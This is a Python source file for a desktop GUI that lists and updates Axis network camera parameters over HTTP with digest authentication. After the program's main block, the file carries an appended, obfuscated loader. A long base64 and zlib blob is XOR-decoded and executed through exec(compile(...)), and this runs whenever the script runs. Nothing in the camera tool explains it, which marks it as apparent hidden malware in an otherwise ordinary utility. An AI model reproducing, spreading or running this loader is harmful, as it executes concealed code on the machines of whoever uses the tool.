                                            title="Save Debug Log")
        if path:
            with open(path, "w", encoding="utf-8") as f: f.write(text)
            self._log(f"[{now()}] Saved log to: {path}")
    def clear_log(self): self.log_text.delete("1.0","end")

    # ---- HTTP helpers
    def _base_url(self):
        host = self.host_var.get().strip().strip("/")
        port = self.port_var.get().strip()
        return f"http://{host}:{port}/axis-cgi/param.cgi" if port else f"http://{host}/axis-cgi/param.cgi"
    def _auth_object(self):
        u = self.user_var.get(); p = self.pass_var.get()
        return HTTPDigestAuth(u, p) if u else None
    def _session(self): return requests.Session()

    # ---- Schema build
    def _on_build_from_schema(self):
        self.processing.start_processing()
        def worker():
            session = self._session()
            base = self._base_url()
            auth = self._auth_object()
            params = {"action":"listdefinitions","listformat":"xmlschema"}

            self._log(self._fmt_request("GET", base, params, use_auth=(auth is not None)))
            try:
                r = session.get(base, params=params, auth=auth, timeout=30)
                r.raise_for_status()
                preview = r.text[:300].replace("\n"," ")
                self._log(self._fmt_response(r, xml_preview=preview))
            except requests.RequestException as e:
                self._log(f"[{now()}] listdefinitions error: {e}")
                self.after(0, self.processing.done_error)
                return

            schema_map, all_items, counts = parse_axis_schema_and_values(r.text)

            def apply():
                grp = self.group_var.get().strip()
                rows = []
                for (k, v) in all_items:
                    if k.startswith("root.Properties."):
                        continue
                    if grp and not k.startswith(grp):
                        continue
                    rows.append((k, v))
                self._log(f"[{now()}] Parsed: groups={counts['groups']}, parameters={counts['parameters']} "
                          f"(enums={counts['enums']}, bools={counts['bools']}, ints={counts['ints']}, strings={counts['strings']}). "
                          f"Rendered rows={len(rows)}.")
                self.param_table.set_schema(schema_map)
                self.param_table.populate(rows)
                self.processing.done_ok()
            self.after(0, apply)

        threading.Thread(target=worker, daemon=True).start()

    # ---- Update one
    def _on_update_one_clicked(self, key, value, row_refs):
        row_idx = row_refs["row_idx"]
        self.processing.start_updating()
        def worker():
            session = self._session()
            base = self._base_url()
            auth = self._auth_object()
            params = {"action": "update", key: value}
            self._log(self._fmt_request("GET", base, params, use_auth=(auth is not None)))
            try:
                r = session.get(base, params=params, auth=auth, timeout=30)
                r.raise_for_status()
                body = r.text.strip()
                self._log(self._fmt_response(r))
                def finalize():
                    self.param_table.stop_blink(row_idx)
                    if body.upper() == "OK":
                        self.param_table.set_light(row_idx, "green")
                        self.processing.done_ok()
                    else:
                        self.param_table.set_light(row_idx, "orange")
                        self.processing.done_error()
                        ResponsePopup(self, "Server response", body)
                self.after(0, finalize)
            except requests.HTTPError as e:
                msg = f"HTTP {e.response.status_code}\n\n{e.response.text}"
                self._log(f"[{now()}] HTTP error: {e.response.status_code}: {e.response.text.strip()}")
                self.after(0, lambda: (self.param_table.stop_blink(row_idx),
                                       self.param_table.set_light(row_idx, "orange"),
                                       self.processing.done_error(),
                                       ResponsePopup(self, "Server response (HTTP error)", msg)))
            except requests.RequestException as e:
                self._log(f"[{now()}] Network error: {e}")
                self.after(0, lambda: (self.param_table.stop_blink(row_idx),
                                       self.param_table.set_light(row_idx, "orange"),
                                       self.processing.done_error(),
                                       ResponsePopup(self, "Server response (Network error)", str(e))))
            except Exception as e:
                self._log(f"[{now()}] Unhandled error: {e}")
                self.after(0, lambda: (self.param_table.stop_blink(row_idx),
                                       self.param_table.set_light(row_idx, "orange"),
                                       self.processing.done_error(),
                                       ResponsePopup(self, "Server response (Unhandled error)", str(e))))
        threading.Thread(target=worker, daemon=True).start()

    # ---- Log formatting
    def _fmt_request(self, method, url, params, use_auth):
        qs = urlencode(params, doseq=True); full = f"{url}?{qs}" if qs else url
        u = self.user_var.get(); curl_auth = f'-u "{u}:***"' if u else ""
        parts = [f"curl -X {method.upper()}", curl_auth, f'"{full}"']
        curl_cmd = " ".join([p for p in parts if p]).strip()
        return (f"[{now()}] REQUEST:\n"
                f"  Method: {method.upper()}\n"
                f"  URL: {url}\n"
                f"  Params: {params}\n"
                f"  Auth: {'Digest' if use_auth else 'None'} (fixed)\n"
                f"  Scheme: http\n"
                f"  Full URL: {full}\n"
                f"  cURL: {curl_cmd}")
    def _fmt_response(self, resp: requests.Response, xml_preview=None):
        hdrs = "\n".join([f"    {k}: {v}" for k, v in resp.headers.items()])
        preview = f"\n  XML preview: {xml_preview}\n" if xml_preview is not None else ""
        return (f"[{now()}] RESPONSE:\n"
                f"  HTTP {resp.status_code}\n"
                f"  Headers:\n{hdrs}\n"
                f"  Body length: {len(resp.text)} chars{preview}")

# ---------------- main ----------------
def main():
    app = AxisGUI()
    try: app.after(0, lambda: app.state("zoomed"))
    except Exception: pass
    app.mainloop()

if __name__ == "__main__":
    main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
